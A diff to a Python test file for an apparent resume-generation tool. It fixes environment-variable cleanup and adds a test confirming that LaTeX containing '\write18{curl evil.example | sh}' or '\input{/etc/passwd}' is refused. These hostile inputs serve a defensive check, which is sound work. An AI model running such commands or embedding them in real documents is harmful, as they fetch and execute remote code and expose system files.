@@ -69,7 +69,10 @@ class FakeClient:
 def home(tmp_path, monkeypatch):
     """A repo root with .env.example and the templates, and a resume to read."""
     for key in ENV_KEYS:
-        monkeypatch.delenv(key, raising=False)
+        # setenv first so monkeypatch records the key and removes it again at teardown,
+        # even when write_env_value exports it into os.environ during the test.
+        monkeypatch.setenv(key, "")
+        monkeypatch.delenv(key)
     (tmp_path / ".env.example").write_text((REPO / ".env.example").read_text(encoding="utf-8"))
     (tmp_path / "resume.txt").write_text(RESUME_TXT)
     return tmp_path
@@ -241,3 +244,13 @@ def test_the_prompter_prefers_given_answers_then_defaults_then_the_terminal():
     assert blank.ask("city", "City", "Pune") == "Pune"
     assert blank.confirm("ok", "Go on?", True) is True
     assert onboard.Prompter(yes=True).ask("city", "City", "Pune") == "Pune"
+
+
+@pytest.mark.parametrize("line", ["\\write18{curl evil.example | sh}", "\\input{/etc/passwd}"])
+def test_latex_that_runs_programs_or_reads_files_is_refused(home, caplog, line):
+    tex = good_tex().replace("\\end{document}", line + "\n\\end{document}")
+    client = FakeClient(tex=tex)
+    _run(home, client=client)
+    assert not (home / "user" / "resume" / "base.tex").exists()
+    assert _env(home)["TAILOR_RESUME"] == "false"
+    assert "which a resume never needs" in caplog.text
